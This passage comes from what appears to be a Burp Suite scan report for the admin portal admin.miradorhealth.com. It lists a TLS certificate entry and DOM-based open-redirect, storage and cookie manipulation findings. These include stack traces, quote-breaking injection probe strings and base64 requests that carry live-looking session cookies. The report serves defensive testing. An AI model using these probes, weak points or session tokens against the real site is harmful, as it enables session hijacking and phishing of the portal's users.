ICAgICAgZXhwb3J0T3B0aW9uczogewogICAgICAgICAgICAgICAgICAgICAgICBjb2x1bW5zOiBjb2x1bW5zTGlzdAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgZXh0ZW5kOiAnZXhjZWwnLAogICAgICAgICAgICAgICAgICAgIHRpdGxlOiAnTWlyYWRvciBJbnNpZ2h0cyBFdmVudCBIaXN0b3J5JywKICAgICAgICAgICAgICAgICAgICBhY3Rpb246IG5ld0V4cG9ydEFjdGlvbiwKICAgICAgICAgICAgICAgICAgICBleHBvcnRPcHRpb25zOiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbHVtbnM6IGNvbHVtbnNMaXN0CiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBjdXN0b21pemVEYXRhOiBmdW5jdGlvbiAoZGF0YSkgewogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBpPTA7IGk8ZGF0YS5ib2R5Lmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBqPTA7IGo8ZGF0YS5ib2R5W2ldLmxlbmd0aDsgaisrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS5ib2R5W2ldW2pdID0gJ1x1MjAwQycgKyBkYXRhLmJvZHlbaV1bal07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgIGluaXRDb21wbGV0ZTogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBkYXRhdGFibGUuYnV0dG9ucygpLmNvbnRhaW5lcigpLmFwcGVuZFRvKCQoJyNleHBvcnQnKSk7CiAgICAgICAgICAgICAgICBpZiAoaW5saW5lRWRpdGluZykgewogICAgICAgICAgICAgICAgICAgICQoJy5kYXRhVGFibGVzX3Njcm9sbEhlYWQgdGgnKS5yZW1vdmVDbGFzcygndGFibGVFZGl0YWJsZSBkLWZsZXgnKTsKICAgICAgICAgICAgICAgICAgICAkKCIuZGF0YVRhYmxlIikuY3NzKCJ0YWJsZS1sYXlvdXQiLCAiZml4ZWQiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgY29sUmVvcmRlcjogewogICAgICAgICAgICAgICAgZml4ZWRDb2x1bW5zTGVmdDogY29sUmVvcmRlckZpeGVkQ29scywKICAgICAgICAgICAgfSwKICAgICAgICAgICAgc3RhdGVTYXZlOiB0cnVlCiAgICAgICAgfSk7CiAgICAgICAgaWYgKHR5cGUgPT0gJ0Rpc3BlbnNlcicpIHsKICAgICAgICAgICAgJCgnI3JlY29yZHNfd3JhcHBlcicpLnByZXBlbmQoJzxkaXYgY2xhc3M9InJvdyBtLTAgbWItMyBjb2xvci1kYXJrLWdyZXkiPjxzdHJvbmc+IlN0cm9uZyIgZm9yIEdyZWVuLCAiV2VhayIgZm9yIFllbGxvdywgYW5kICJDcml0aWNhbCIgZm9yIFJlZDwvc3Ryb25nPjwvZGl2PicpOwogICAgICAgIH0KICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxIZWFkJykuc2Nyb2xsKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxCb2R5Jykuc2Nyb2xsTGVmdCgkKCcuZGF0YVRhYmxlc19zY3JvbGxIZWFkJykuc2Nyb2xsTGVmdCgpKTsKICAgICAgICB9KTsKICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxCb2R5Jykuc2Nyb2xsKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxIZWFkJykuc2Nyb2xsTGVmdCgkKCcuZGF0YVRhYmxlc19zY3JvbGxCb2R5Jykuc2Nyb2xsTGVmdCgpKTsKICAgICAgICB9KTsKICAgIH0KPC9zY3JpcHQ+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CgogICAgPHNjcmlwdD4KICAgIHZhciBjaGFydHM9W107CiAgICBpZiAoJCgnI2FkbWluRGFzaGJvYXJkRmlsdGVycycpLmxlbmd0aCkgewogICAgICAgIGRhc2hib2FyZFJlZnJlc2hDaGFydHMoKTsKICAgIH0KICAgIGlmICgkKCcjc2FmZkRhc2hib2FyZEZpbHRlcnMnKS5sZW5ndGgpIHsKICAgICAgICBzdGFmZlVzZXJEYXNoYm9hcmRSZWZyZXNoQ2hhcnRzKCczOTknLCAnMScpOwogICAgfQogICAgPC9zY3JpcHQ+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7769337323483628544</serialNumber>
    <type>16777472</type>
    <name><![CDATA[TLS certificate]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>TLS (or SSL) helps to protect the confidentiality and integrity of information in transit between the browser and server, and to provide authentication of the server's identity. To serve this purpose, the server must present an TLS certificate that is valid for the server's hostname, is issued by a trusted authority and is valid for the current date. If any one of these requirements is not met, TLS connections to the server will not provide the full protection for which TLS is designed.</p>
<p>It should be noted that various attacks exist against TLS in general, and in the context of HTTPS web connections in particular. It may be possible for a determined and suitably-positioned attacker to compromise TLS connections without user detection even when a valid TLS certificate is used. </p>]]></issueBackground>
    <references><![CDATA[<ul><li><a href="https://wiki.mozilla.org/Security/Server_Side_TLS">SSL/TLS Configuration Guide</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/295.html">CWE-295: Improper Certificate Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/326.html">CWE-326: Inadequate Encryption Strength</a></li><li><a href="https://cwe.mitre.org/data/definitions/327.html">CWE-327: Use of a Broken or Risky Cryptographic Algorithm</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The server presented a valid, trusted TLS certificate. This issue is purely informational.<br><br>The server presented the following certificates:<br><br><h4>Server certificate</h4><table><tr><td><b>Issued to:</b>&nbsp;&nbsp;</td><td>*.miradorhealth.com, miradorhealth.com</td></tr><tr><td><b>Issued by:</b>&nbsp;&nbsp;</td><td>Go Daddy Secure Certificate Authority - G2</td></tr><tr><td><b>Valid from:</b>&nbsp;&nbsp;</td><td>Mon May 20 11:52:50 CDT 2024</td></tr><tr><td><b>Valid to:</b>&nbsp;&nbsp;</td><td>Sat Jun 21 11:13:18 CDT 2025</td></tr></table><h4>Certificate chain #1</h4><table><tr><td><b>Issued to:</b>&nbsp;&nbsp;</td><td>Go Daddy Secure Certificate Authority - G2</td></tr><tr><td><b>Issued by:</b>&nbsp;&nbsp;</td><td>Go Daddy Root Certificate Authority - G2</td></tr><tr><td><b>Valid from:</b>&nbsp;&nbsp;</td><td>Tue May 03 02:00:00 CDT 2011</td></tr><tr><td><b>Valid to:</b>&nbsp;&nbsp;</td><td>Sat May 03 02:00:00 CDT 2031</td></tr></table><h4>Certificate chain #2</h4><table><tr><td><b>Issued to:</b>&nbsp;&nbsp;</td><td>Go Daddy Root Certificate Authority - G2</td></tr><tr><td><b>Issued by:</b>&nbsp;&nbsp;</td><td>Go Daddy Class 2 Certification Authority</td></tr><tr><td><b>Valid from:</b>&nbsp;&nbsp;</td><td>Wed Jan 01 01:00:00 CST 2014</td></tr><tr><td><b>Valid to:</b>&nbsp;&nbsp;</td><td>Fri May 30 02:00:00 CDT 2031</td></tr></table><h4>Certificate chain #3</h4><table><tr><td><b>Issued to:</b>&nbsp;&nbsp;</td><td>Go Daddy Class 2 Certification Authority</td></tr><tr><td><b>Issued by:</b>&nbsp;&nbsp;</td><td>Go Daddy Class 2 Certification Authority</td></tr><tr><td><b>Valid from:</b>&nbsp;&nbsp;</td><td>Tue Jun 29 12:06:20 CDT 2004</td></tr><tr><td><b>Valid to:</b>&nbsp;&nbsp;</td><td>Thu Jun 29 12:06:20 CDT 2034</td></tr></table><h4>Certificate chain #4</h4><table><tr><td><b>Issued to:</b>&nbsp;&nbsp;</td><td>Go Daddy Class 2 Certification Authority</td></tr><tr><td><b>Issued by:</b>&nbsp;&nbsp;</td><td>Go Daddy Class 2 Certification Authority</td></tr><tr><td><b>Valid from:</b>&nbsp;&nbsp;</td><td>Tue Jun 29 12:06:20 CDT 2004</td></tr><tr><td><b>Valid to:</b>&nbsp;&nbsp;</td><td>Thu Jun 29 12:06:20 CDT 2034</td></tr></table>]]></issueDetail>
  </issue>
  <issue>
    <serialNumber>7112657124889652224</serialNumber>
    <type>5243152</type>
    <name><![CDATA[Open redirection (DOM-based)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Low</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>

<p>DOM-based open redirection arises when a script  writes controllable data into the target of a redirection in an unsafe way. An attacker may be able to use the vulnerability to  construct a URL that, if visited by another application user, will cause a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.</p>
<p><b>Note:</b> If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack, by using a URL with the javascript: pseudo-protocol to execute arbitrary script code when the URL is processed by the browser.</p>

<p>Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based open redirection vulnerabilities is not to dynamically set redirection targets using data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing an arbitrary URL as a redirection target. In general, this is best achieved by using a whitelist of URLs that are permitted redirection targets, and strictly validating the target against this list before performing the redirection.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/dom-based/open-redirection">Web Security Academy: Open redirection (DOM-based)</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601: URL Redirection to Untrusted Site ('Open Redirect')</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to DOM-based open redirection. Data is read from <b>input.value</b> and passed to <b>xhr.open</b>.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWo3YXZubDV1dDBhdGtzYTRiM2RvNWQ3amM2OyBzY3JlZW5XaWR0aD04MDA7IEFXU0FMQj1TWks2eDZNbW5qckNaeUJYMTBpcmU0VlA3WTNHNzJNSHpLaVR2cjFscktoVDkyaUw5c0ZmWi9wcnA2aDg3L0FCU002NHpMTlNub01GNC9TY2Nmc3hHR3p0WXpWbithcEFIempVb29abFgyViswYk9XRk1OajRKYmtSWUNHOyBBV1NBTEJDT1JTPVNaSzZ4Nk1tbmpyQ1p5QlgxMGlyZTRWUDdZM0c3Mk1IektpVHZyMWxyS2hUOTJpTDlzRmZaL3BycDZoODcvQUJTTTY0ekxOU25vTUY0L1NjY2ZzeEdHenRZelZuK2FwQUh6alVvb1psWDJWKzBiT1dGTU5qNEpia1JZQ0cNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4NClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <dynamicAnalysis>
      <source>input.value</source>
      <sink>xhr.open</sink>
      <sourceStackTrace>at Object.BQODu (&lt;anonymous&gt;:1:95774)
at Object.USBMk (&lt;anonymous&gt;:1:394438)
at HTMLInputElement.get (&lt;anonymous&gt;:1:398284)
at HTMLInputElement.get [as value] (&lt;anonymous&gt;:1:514193)
at HTMLInputElement.onkeyup (https://admin.miradorhealth.com/:41:163)
at _0x372f23 (&lt;anonymous&gt;:1:148382)
at Object.NQWnL (&lt;anonymous&gt;:1:8863)
at _0x2a880c (&lt;anonymous&gt;:1:153429)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sourceStackTrace>
      <sinkStackTrace>at Object.XMhUr (&lt;anonymous&gt;:1:544502)
at _0x13dcf0 (&lt;anonymous&gt;:1:558761)
at _0xdc6a5f.&lt;computed&gt;._0x13cc4d.oknbI._0x3e2633.XMLHttpRequest.&lt;computed&gt; [as open] (&lt;anonymous&gt;:1:458938)
at Object.send (https://admin.miradorhealth.com/js/jquery.min.js:4:26275)
at Function.ajax (https://admin.miradorhealth.com/js/jquery.min.js:4:22180)
at advSearch (https://admin.miradorhealth.com/js/scripts.js?v=6ec421:11:11)
at HTMLInputElement.onkeyup (https://admin.miradorhealth.com/:41:148)
at _0x372f23 (&lt;anonymous&gt;:1:148382)
at Object.NQWnL (&lt;anonymous&gt;:1:8863)
at _0x2a880c (&lt;anonymous&gt;:1:153429)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sinkStackTrace>
      <eventListenerStackTrace></eventListenerStackTrace>
      <sourceValue></sourceValue>
      <sinkValue>https://admin.miradorhealth.com/Search/fxjpztzs01%2527%2522`&apos;&quot;/fxjpztzs01/&gt;&lt;fxjpztzs01/\&gt;vm35wh1kyo&amp;</sinkValue>
      <eventHandlerData></eventHandlerData>
      <eventHandlerDataType></eventHandlerDataType>
      <eventHandlerManipulatedData></eventHandlerManipulatedData>
      <poc></poc>
      <origin></origin>
      <isOriginChecked>false</isOriginChecked>
      <sourceElementId></sourceElementId>
      <sourceElementName></sourceElementName>
      <eventFiredEventName>keyup</eventFiredEventName>
      <eventFiredElementId></eventFiredElementId>
      <eventFiredElementName></eventFiredElementName>
      <eventFiredOuterHtml>&lt;input class=&quot;form-control&quot; type=&quot;search&quot; placeholder=&quot;Search&quot; aria-label=&quot;Search&quot; onkeyup=&quot;advSearc</eventFiredOuterHtml>
    </dynamicAnalysis>
  </issue>
  <issue>
    <serialNumber>2248350184818103296</serialNumber>
    <type>5246720</type>
    <name><![CDATA[HTML5 storage manipulation (DOM-based)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>
<p>HTML5 storage manipulation arises when a script stores controllable data in the HTML5 storage of the web browser (either localStorage or sessionStorage). An attacker may be able to use this behavior to construct a URL that, if visited by another application user, will cause the user's browser to store attacker-controllable data.</p>
<p>This behavior does not in itself constitute a security vulnerability. However, if the application later reads the data back from storage and processes it in an unsafe way, then an attacker may be able to leverage the storage mechanism to deliver other DOM-based attacks, such as cross-site scripting and JavaScript injection.
</p>

<p>Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based HTML5 storage manipulation is not to place in HTML5 storage any data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from being stored.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/dom-based/html5-storage-manipulation">Web Security Academy: HTML5 storage manipulation (DOM-based)</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://capec.mitre.org/data/definitions/153.html">CAPEC-153: Input Data Manipulation</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to DOM-based HTML5 storage manipulation. Data is read from <b>location.pathname</b> and passed to <b>localStorage.setItem.name</b>.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWo3YXZubDV1dDBhdGtzYTRiM2RvNWQ3amM2OyBzY3JlZW5XaWR0aD04MDA7IEFXU0FMQj1TWks2eDZNbW5qckNaeUJYMTBpcmU0VlA3WTNHNzJNSHpLaVR2cjFscktoVDkyaUw5c0ZmWi9wcnA2aDg3L0FCU002NHpMTlNub01GNC9TY2Nmc3hHR3p0WXpWbithcEFIempVb29abFgyViswYk9XRk1OajRKYmtSWUNHOyBBV1NBTEJDT1JTPVNaSzZ4Nk1tbmpyQ1p5QlgxMGlyZTRWUDdZM0c3Mk1IektpVHZyMWxyS2hUOTJpTDlzRmZaL3BycDZoODcvQUJTTTY0ekxOU25vTUY0L1NjY2ZzeEdHenRZelZuK2FwQUh6alVvb1psWDJWKzBiT1dGTU5qNEpia1JZQ0cNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4NClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <dynamicAnalysis>
      <source>location.pathname</source>
      <sink>localStorage.setItem.name</sink>
      <sourceStackTrace>at Object._0x165f99 [as proxiedGetterCallback] (&lt;anonymous&gt;:1:557377)
at get pathname (&lt;anonymous&gt;:1:249642)
at Object.fnStateSaveCallback (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:147:26)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:410)
at r.iterator (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:102:14)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:359)
at Function.clear (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:104:410)
at filterData (https://admin.miradorhealth.com/:740:29)
at HTMLButtonElement.onclick (https://admin.miradorhealth.com/:328:3489)
at _0x14405e (&lt;anonymous&gt;:1:147957)
at _0x2a880c (&lt;anonymous&gt;:1:151903)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sourceStackTrace>
      <sinkStackTrace>at Object.XMhUr (&lt;anonymous&gt;:1:544502)
at _0x13dcf0 (&lt;anonymous&gt;:1:558761)
at Object.uXLIG (&lt;anonymous&gt;:1:437510)
at Object.yUDKe (&lt;anonymous&gt;:1:452444)
at _0xdc6a5f.tYxZd.quoteContext [as setItem] (&lt;anonymous&gt;:1:453117)
at Object.fnStateSaveCallback (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:146:487)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:410)
at r.iterator (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:102:14)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:359)
at Function.clear (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:104:410)
at filterData (https://admin.miradorhealth.com/:740:29)
at HTMLButtonElement.onclick (https://admin.miradorhealth.com/:328:3489)
at _0x14405e (&lt;anonymous&gt;:1:147957)
at _0x2a880c (&lt;anonymous&gt;:1:151903)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sinkStackTrace>
      <eventListenerStackTrace></eventListenerStackTrace>
      <sourceValue>/////jjvwyqfltb%27%22%60&apos;%22/jjvwyqfltb/%3E%3Cjjvwyqfltb//%3Eun6um5nuqb&amp;</sourceValue>
      <sinkValue>DataTables_records_/////jjvwyqfltb%27%22%60&apos;%22/jjvwyqfltb/%3E%3Cjjvwyqfltb//%3Eun6um5nuqb&amp;</sinkValue>
      <eventHandlerData></eventHandlerData>
      <eventHandlerDataType></eventHandlerDataType>
      <eventHandlerManipulatedData></eventHandlerManipulatedData>
      <poc></poc>
      <origin></origin>
      <isOriginChecked>false</isOriginChecked>
      <sourceElementId></sourceElementId>
      <sourceElementName></sourceElementName>
      <eventFiredEventName>click</eventFiredEventName>
      <eventFiredElementId></eventFiredElementId>
      <eventFiredElementName></eventFiredElementName>
      <eventFiredOuterHtml>&lt;button class=&quot;btn btn-dark float-sm-right mr-2&quot; onclick=&quot;filterData(&apos;filter&apos;)&quot;&gt;Submit&lt;/button&gt;</eventFiredOuterHtml>
    </dynamicAnalysis>
  </issue>
  <issue>
    <serialNumber>991356184144773120</serialNumber>
    <type>5245696</type>
    <name><![CDATA[Cookie manipulation (DOM-based)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Low</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>

<p>DOM-based cookie manipulation arises when a  script writes controllable data into the value of a cookie. An attacker may be able to use the vulnerability to construct a URL that, if visited by another application user, will set an arbitrary value in the user's cookie.</p>
<p>The potential impact of the vulnerability depends on the role that the cookie plays within the application. If the cookie is used to control the behavior that results from certain user actions (for example, a 'production' versus 'demo' mode setting), then the attacker may be able to cause the user to perform unintended actions by manipulating the cookie's value. If the cookie is used to track the user's session, then the attacker may be able to perform a session fixation attack, in which they set the cookie's value to a valid token that they have obtained from the application, and then hijack the session during the victim user's subsequent interaction with the application.</p>

<p>Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based cookie manipulation vulnerabilities is not to dynamically write to cookies using data that originated from any untrusted source. This behavior should never be implemented for cookies that have any role in controlling privileged actions or user sessions within the application.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/dom-based/cookie-manipulation">Web Security Academy: Cookie manipulation (DOM-based)</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/565.html">CWE-565: Reliance on Cookies without Validation and Integrity Checking</a></li><li><a href="https://cwe.mitre.org/data/definitions/829.html">CWE-829: Inclusion of Functionality from Untrusted Control Sphere</a></li><li><a href="https://capec.mitre.org/data/definitions/31.html">CAPEC-31: Accessing/Intercepting/Modifying HTTP Cookies</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to DOM-based cookie manipulation. Data is read from <b>input.value</b> and passed to <b>document.cookie</b>.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWo3YXZubDV1dDBhdGtzYTRiM2RvNWQ3amM2OyBzY3JlZW5XaWR0aD04MDA7IEFXU0FMQj1TWks2eDZNbW5qckNaeUJYMTBpcmU0VlA3WTNHNzJNSHpLaVR2cjFscktoVDkyaUw5c0ZmWi9wcnA2aDg3L0FCU002NHpMTlNub01GNC9TY2Nmc3hHR3p0WXpWbithcEFIempVb29abFgyViswYk9XRk1OajRKYmtSWUNHOyBBV1NBTEJDT1JTPVNaSzZ4Nk1tbmpyQ1p5QlgxMGlyZTRWUDdZM0c3Mk1IektpVHZyMWxyS2hUOTJpTDlzRmZaL3BycDZoODcvQUJTTTY0ekxOU25vTUY0L1NjY2ZzeEdHenRZelZuK2FwQUh6alVvb1psWDJWKzBiT1dGTU5qNEpia1JZQ0cNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4NClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <dynamicAnalysis>
      <source>input.value</source>
      <sink>document.cookie</sink>
      <sourceStackTrace>at Object.BQODu (&lt;anonymous&gt;:1:95774)
at Object.USBMk (&lt;anonymous&gt;:1:394438)
at HTMLInputElement.get (&lt;anonymous&gt;:1:398284)
